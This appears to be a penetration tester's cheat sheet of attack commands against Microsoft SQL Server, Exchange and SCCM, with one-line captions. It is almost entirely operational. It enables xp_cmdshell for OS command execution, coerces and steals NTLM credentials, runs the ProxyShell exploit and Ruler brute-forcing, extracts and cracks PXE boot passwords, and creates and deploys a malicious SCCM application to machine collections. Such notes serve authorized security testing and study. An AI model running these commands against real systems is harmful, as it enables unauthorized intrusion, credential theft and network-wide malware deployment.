#ad #mssql #exchange #sccm #sql

# MSSQL, Exchange & SCCM Attacks

Related: [trust-attacks](trust-attacks.md) · [netexec](NetExec.md) · [ntlm-relay](ntlm-relay.md) · [pivoting](../Network/pivoting.md) · [hashcat](../Passwords/hashcat.md)

## MSSQL
```bash
impacket-mssqlclient <User>@<IP>
```
Connect to an MSSQL server (Impacket).

```sql
SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin FROM master.sys.server_principals r LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid WHERE r.type IN ('S','E','X','U','G');
```
Enumerate server logins and roles.

```sql
SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';
```
Find logins you can impersonate.

```sql
EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';
```
UNC path injection / file existence check (coerce auth). See [ntlm-relay](ntlm-relay.md).

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'ipconfig';
```
Enable xp_cmdshell and run an OS command.

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'ole automation procedures', 1; RECONFIGURE;
```
Enable OLE Automation stored procedures.

```sql
EXEC sp_linkedservers;
```
Enumerate linked database servers.

```sql
SELECT * FROM OPENQUERY(<DATABASE>, 'SELECT name, database_id, create_date FROM sys.databases');
```
Run a SELECT on a linked server.

```sql
SELECT * FROM OPENQUERY(<DATABASE>, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
```
Check sysadmin membership on a linked server.

## Exchange
```bash
curl https://<TARGET_IP>/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version
```
Enumerate the Exchange version.

```bash
python3 ntlm_theft.py -g htm -s <TARGET_IP> -f <USER>
```
Generate an HTML NTLM-theft payload. See [ntlm-relay](ntlm-relay.md).

```bash
python3 proxyshell.py -u <URL> -e <EMAIL>
```
ProxyShell exploit against a target mailbox.

```bash
./username-anarchy --input-file ./names.txt
```
Generate username variations from names.

```bash
./ruler-linux64 --domain <DOMAIN> --insecure brute --users users.txt --passwords password.txt --verbose
```
Brute-force creds against Exchange (Ruler).

## SCCM
```bash
python pxethief.py 2 <TARGET_IP>
```
Enumerate a target with PXEThief.

```bash
tftp -i <TARGET_IP> GET "\SMSTemp\<TIMESTAMP>.{<GUID>}.boot.var" "<TIMESTAMP>.{<GUID>}.boot.var"
```
Download the PXE boot media variable file via TFTP.

```bash
python pxethief.py 5 '.\<TIMESTAMP>.{<GUID>}.boot.var'
```
Parse the boot variable file with PXEThief.

```bash
hashcat -m 19850 -a 0 hash /usr/share/wordlists/rockyou.txt
```
Crack the PXE boot media password.

```bash
python pxethief.py 3 '.\<TIMESTAMP>.{<GUID>}.boot.var' "<PASSWORD>"
```
Extract the password from the boot variable file.

```bash
proxychains4 -q python3 sccmhunter.py find -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <DC_IP>
```
Discover SCCM infrastructure (SCCMHunter).

```bash
proxychains4 -q python3 sccmhunter.py admin -u <USER> -p <NTLM_HASH> -ip <TARGET_IP>
```
Admin actions via SCCMHunter (NTLM hash auth).

```cmd
.\SharpSCCM.exe invoke client-push -t <TARGET_IP>
```
Trigger client-push install coercion (SharpSCCM). See [ntlm-relay](ntlm-relay.md).

```cmd
.\SharpSCCM.exe get primary-users -u <USER> -sms <TARGET_IP>
```
Get primary users from the SCCM server.

```cmd
.\SharpSCCM.exe new application -s -n <APPLICATION_NAME> -p <PATH_TO_EXECUTABLE> -sms <TARGET_IP>
```
Create a malicious SCCM application for deployment.

```cmd
.\SharpSCCM.exe new deployment -a <APPLICATION_NAME> -c "<COLLECTION_NAME>" -sms <TARGET_IP>
```
Deploy the application to a collection.
